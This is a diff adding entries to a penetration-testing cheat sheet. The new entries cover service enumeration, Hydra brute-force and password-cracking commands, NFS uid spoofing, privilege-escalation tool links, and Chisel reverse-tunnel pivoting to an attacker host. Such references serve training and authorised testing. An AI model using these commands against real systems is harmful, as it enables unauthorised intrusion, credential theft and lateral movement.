@@ -85,6 +85,13 @@ nmap <IP> -oA <FILE> # all formats
 
 * connect with `ftp IP`
 * check for `anonymous:anonymous` login
+* check the ftp version and nmap has a couple of quick-win scripts:
+
+```sh
+nmap --script ftp-anon <IP>
+nmap --script ftp-vsftpd-backdoor <IP>
+nmap --script ftp-vuln-cve2010-4221 <IP>
+```
 
 #### Port 22 open
 
@@ -92,9 +99,36 @@ nmap <IP> -oA <FILE> # all formats
 ```sh
 hydra -L users.txt -P pass.txt IP ssh
 ```
-* **Post-exploitation**: possible writable `~/.ssh/authorized_keys`.
+Other wordlists to try out: `/usr/share/wordlists/wfuzz/others/common_pass.txt`
+
+Think about creating a wordlist from the target website for example.
+
+* **Post-exploitation**:
+
+* possible writable `~/.ssh/authorized_keys`.
+* weak crypto: [https://github.com/Ganapati/RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
+* predictable key: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
 
 [Go to Post-Exploitation](#post-exploitation)
+
+#### Port 25 open
+
+You may be able to enumerate usernames through SMTP.
+
+```sh
+nc <IP> 25
+[...]
+VRFY root
+252 2.0.0 root
+VRFY idontexist
+550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table
+```
+
+Or the lazy way, use `smtp-user-enum`:
+
+```sh
+smtp-user-enum -M VRFY -u root -t <IP>
+```
 
 #### Port 53 open
 
@@ -103,11 +137,20 @@ hydra -L users.txt -P pass.txt IP ssh
 
 ```sh
 host -l <DOMAIN> <IP>
+dig axfr @SRHOST <DOMAIN>
+dnsrecon -d <DOMAIN>
+```
+
+* enumerate subdomains:
+
+```sh
+amass -v -d <DOMAIN>
+sublist3r -d <DOMAIN> -t 3 -e bing
 ```
 
 #### Port 80 open
 
-* Web-service running, use `dirb` or `gobuster` to get the most information as possible.
+* Web-service running, use `dirb`, `nikto` or `gobuster` to get the most information as possible.
 
 *Examples*:
 
@@ -129,12 +172,18 @@ file:
 **Common exploits**:
 
 * XSS
-* SQLi
-* Directory Traversal
+* SQLi (l'`UNION` fait la force!)
+* Directory Traversal ([Path traversal list windows](https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/) and [path traversal list linux](https://gracefulsecurity.com/path-traversal-cheat-sheet-linux/))
 * Default credentials (admin:admin, root:root... Check also the name of the service or the default password for the running application.)
 * if CGI-bin, check for Shellshock (TODO)
 
 [Go to Exploitation](#exploitation)
+
+*Other things*:
+
+```sh
+sslscan <IP>
+```
 
 #### Port 88
 
@@ -220,7 +269,27 @@ nmap -sV --script=nfs-showmount <target>
 mkdir temp
 mount -o nolock IP:/ $PWD/temp
 mount -o rw,vers=2 <target>:<share> <local_directory>
+# add a user if you can
+groupadd --gid 1337 pwn
+useradd --uid 1337 -g pwn pwn
 ```
+
+* Some RPC stuff
+
+```sh
+nmap -sV -p 111 --script rpcinfo <IP>
+```
+
+#### Port 161 (UDP)
+
+```sh
+sudo nmap -sU -sV -sC --open -p 161 <IP>
+# get something out of that
+snmp-check <IP>
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
+snmpwalk -v1 -c public <IP>
+```
+
 
 #### Existing databases
 
@@ -678,6 +747,10 @@ findstr /si password *.xml *.ini *.txt
 #### Automation
 
 * [WinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
+* [COMahawk](https://github.com/apt69/COMahawk)
+
+JuicyPotato, HotPotato...
 
 
 ### Linux
@@ -727,6 +800,9 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 
 * [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
 * [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+* [LinEnum](https://github.com/rebootuser/LinEnum)
+* MySQL running as root? [`raptor_udf2.c`](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c)
+* [Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy)
 
 ### Send files to remote hosts
 
@@ -735,6 +811,46 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```powershell
 Invoke-Webrequest -Uri <IP> -OutFile <DestFile>
 ```
+
+#### Impacket-smbserver
+
+```sh
+impacket-smbserver secure . (-smb2support)
+copy \\<IP>\secure\<FILE>
+```
+
+## Pivoting
+
+SSH access always gives you the easiest pivot. You can set up a SOCKS proxy by adding the -D flag as follows.
+
+`ssh $USERNAME@$RHOST -D 1080`
+
+This opens a SOCKS proxy on your machine’s port 1080, which is proxied to the target system. You can configure to use it with proxychains quite easily.
+
+Another nice addition to the proxying portfolio is sshuttle, it does some magic to automatically proxy traffic from your host to a certain subnet through the target system.
+
+`shuttle -r $USERNAME@$RHOST 10.1.1.0/24`
+
+If you only have Windows systems to deal with, Chisel comes highly recommended. It’s a bit more complicated to set up a full SOCKS proxy, as it requires two sessions on the target. The required commands are as below.
+
+On Kali:
+
+    ./chisel server -p 8000 --reverse
+
+On target:
+
+    .\chisel_windows_386.exe client $LHOST:8000 R:8001:127.0.0.1:9001
+
+Now we are listening on localhost:8001 on kali to forward that traffic to target:9001.
+
+Then, open the Socks server: On target:
+
+    .\chisel_windows_386.exe server -p 9001 --socks5
+
+On Kali:
+
+    ./chisel client localhost:8001 socks
+
 
 ## Port forwarding
 
@@ -770,18 +886,41 @@ Decompress with tar:
 tar -C <DEST> -xvf <FILE>
 ```
 
+### John
+
+```sh
+john --wordlist=dict.txt passwd
+john --show passwd
+john --restore
+unshadow passwd shadow > unshadowed.txt
+john --wordlist=dict.txt unshadowed.txt
+```
+
 ### Hashcat
 
 Basic use:
 
 ```sh
 hashcat -m 0 -a 0 -o <OUTPUT_FILE> <INPUT_FILE> <WORDLIST>
+
+# basic bruteforce attack for MD5
+hashcat -a 0 -m 0 hashes.txt dict.txt
+
+# basic bruteforce with combinations for MD5 (this will add the combinations of
+hashcat -a 1 -m 0 hashes.txt dict.txt
 ```
 
 * `-m`: defines the algorithm type ([full list](https://hashcat.net/wiki/doku.php?id=example_hashes))
 * `-a`: attack mode (0: straight, 1: combination, 3: brute-force)
 
 ### Hydra
+
+```sh
+hydra -l user -P passlist.txt ftp://192.168.0.1
+hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+hydra -C defaults.txt -6 pop3s://[fe80::2c:31ff:fe12:ac11]:143/TLS:DIGEST-MD5
+hydra -L users.txt -P pass.txt <IP> -s <PORT> http-post-form "/users/sign_in:user[email]=^USER^&user[password]=^PASS^&user[Commit]=Log inn:Invalid Email or password.
+```
 
 ### Binwalk
 
@@ -822,6 +961,7 @@ alias grepip='grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"'
 * [Red Teaming Experiments](https://ired.team/)
 * [absolom.com](https://www.absolomb.com/)
 * [blog.g0tmi1k.com](https://blog.g0tmi1k.com/)
+* [Security Ramblings](https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#reconnaissance)
 
 ## Videos
 
